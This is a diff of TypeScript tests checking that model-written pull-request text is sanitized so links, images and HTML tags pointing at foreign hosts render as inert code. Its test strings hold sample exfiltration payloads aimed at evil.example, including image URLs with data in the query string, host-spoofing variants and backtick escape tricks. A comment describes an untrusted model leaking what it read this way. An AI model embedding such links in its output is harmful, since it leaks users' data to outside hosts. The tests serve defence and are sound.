@@ -163,3 +163,97 @@ test("on GitHub the GitLab guard is not applied: fences, lines that start with a
   const body = buildPrBody({ issueNumber: 7, text: { ...PR_TEXT, summary: "- step\n  ```sh\n  /close ~x\n  ```" }, slices: [], review: {}, deferred: [], forge: "github" });
   assert.ok(body.includes("## Summary\n\n- step\n  ```sh\n  /close ~x\n  ```\n"), body);
 });
+
+// ── Links that carry data away ────────────────────────────────────────────────────────────────────────────────────────────────
+// An image, an HTML tag or a link that points at a host the forge does not own is fetched or followed by whoever reads the page, so
+// a URL whose query string holds what the model read leaks it. Such text is shown as code instead, and its `http://` is broken
+// with a zero-width space, so a backtick that the model wrote around it cannot give it back its effect.
+
+/** `text` with every inline code span removed: what a Markdown renderer could still turn into a link or an image. */
+const outsideCode = (text: string) => text.replace(/`[^`]*`/g, "");
+/** Does `text` hold a URL a parser would take for one: a scheme and `//`, or a protocol-relative `//host`? */
+const hasLiveUrl = (text: string) => /https?:\/\/|(?<![\w:/.-])\/\/[\w[]/i.test(text);
+
+test("a Markdown image, an HTML image or link and a bare URL that point outside the forge are shown as code", () => {
+  const image = sanitizeModelText("![x](https://evil.example/?k=1)", "github");
+  assert.equal(outsideCode(image), "", `an image outside code: ${image}`);
+  assert.ok(image.startsWith("`![x](") && image.endsWith("evil.example/?k=1)`"), image);
+  assert.ok(!hasLiveUrl(image), image);
+
+  for (const html of ['<img src="https://evil.example/?d=1">', "<a href='https://evil.example/x?d=1'>click</a>", "<img\n src=https://evil.example/?d=1 />"]) {
+    const out = sanitizeModelText(`before ${html} after`, "github");
+    assert.doesNotMatch(outsideCode(out), /<(img|a)\b/, out);
+    assert.ok(!hasLiveUrl(out), out);
+  }
+  const bare = sanitizeModelText("see https://evil.example/?d=1 now", "github");
+  assert.match(bare, /^see `https.\/\/evil\.example\/\?d=1` now$/u);
+  assert.ok(!hasLiveUrl(bare), bare);
+});
+
+test("a link, an autolink and a reference definition that point outside the forge are neutralized too", () => {
+  for (const text of ["[docs](https://evil.example/?d=1)", "<https://evil.example/?d=1>", "![x][r]\n\n[r]: https://evil.example/?d=1", '[docs](https://evil.example/a "title")']) {
+    const out = sanitizeModelText(text, "github");
+    assert.ok(!hasLiveUrl(outsideCode(out)), `${text} -> ${out}`);
+    assert.ok(!hasLiveUrl(out), `${text} -> ${out}`);
+  }
+});
+
+test("a protocol-relative URL is a URL: an image or an attribute that starts with // is neutralized", () => {
+  for (const text of ["![x](//evil.example/a.png?d=1)", '<img src="//evil.example/a.png?d=1">']) {
+    const out = sanitizeModelText(text, "github");
+    assert.ok(!hasLiveUrl(out), `${text} -> ${out}`);
+    assert.ok(out.includes("`"), out);
+  }
+});
+
+test("a link to the forge's own host stays clickable, whatever its text, and so does a path inside the repository", () => {
+  for (const text of [
+    "see https://github.com/owner/repo/pull/3 and [the PR](https://github.com/owner/repo/pull/3)",
+    "![diagram](https://github.com/owner/repo/raw/main/docs/a.png)",
+    '<a href="https://github.com/owner/repo/issues/9#issuecomment-1">the comment</a>',
+    "[the guide](docs/guide.md) and ![local](docs/a.png)",
+    "[https://evil.example/shown-as-text](https://github.com/owner/repo)",
+  ]) {
+    assert.equal(sanitizeModelText(text, "github"), text, text);
+  }
+  assert.equal(sanitizeModelText("see https://gitlab.com/group/project/-/merge_requests/4", "gitlab"), "see https://gitlab.com/group/project/-/merge_requests/4");
+});
+
+test("a host that only starts or ends like the forge's, or hides behind it, is not the forge", () => {
+  for (const url of ["https://github.com.evil.example/x?d=1", "https://github.com@evil.example/x?d=1", "https://evil.example/https://github.com/x", "https://evilgithub.com/x", "https://gist.github.com/x?d=1", "HTTPS://EVIL.EXAMPLE/?d=1"]) {
+    const out = sanitizeModelText(`see ${url} now`, "github");
+    assert.ok(!hasLiveUrl(out), `${url} -> ${out}`);
+  }
+  assert.ok(!hasLiveUrl(sanitizeModelText("see https://github.com/x", "gitlab")), "another forge's host is not this forge's");
+});
+
+test("a backtick the model writes around a link does not give it back its effect", () => {
+  // The model is untrusted: it can open a code span before the link and close it after, so that a span added around the link would pair with
+  // those backticks and leave the link outside any code. The scheme is broken as well, so there is nothing left to follow.
+  for (const text of ["`x ![i](https://evil.example/?d=1) y`", "```https://evil.example/?d=1", "``a ![i](//evil.example/?d=1) `` b", "`a` `![i](https://evil.example/?d=1)` `b`"]) {
+    const out = sanitizeModelText(text, "github");
+    assert.ok(!hasLiveUrl(out), `${text} -> ${out}`);
+  }
+});
+
+test("text without a link to follow is left alone", () => {
+  for (const text of ["the `https` module and a//b paths, ![not an image", "write [x](not a link) or a <b>bold</b> word", "1 < 2 > 0, a<b and c>d", "no scheme: example.com/x?d=1"]) {
+    assert.equal(sanitizeModelText(text, "github"), text, text);
+  }
+});
+
+test("a PR body holds the host of a link the model wrote only inside code, in every field the model writes", () => {
+  const link = "![x](https://evil.example/?k=1)";
+  const body = buildPrBody({
+    issueNumber: 7,
+    text: { summary: `s ${link}`, door: "one-way", doorNote: `d ${link}`, blastRadius: `b ${link}`, blastNote: `n https://evil.example/?k=2` },
+    slices: [{ key: "k", behavior: `behaviour ${link}`, seam: "seam", done: true, alreadySatisfied: `already ${link}` }],
+    review: {},
+    deferred: [],
+    forge: "github",
+  });
+  assert.ok(body.includes("evil.example"), "the link is shown, as code");
+  assert.doesNotMatch(outsideCode(body), /evil\.example/, body);
+  assert.ok(!hasLiveUrl(body), body);
+  assert.ok(sanitizeModelText("[PR](https://github.com/o/r/pull/1)", "github").includes("](https://github.com/o/r/pull/1)"));
+});
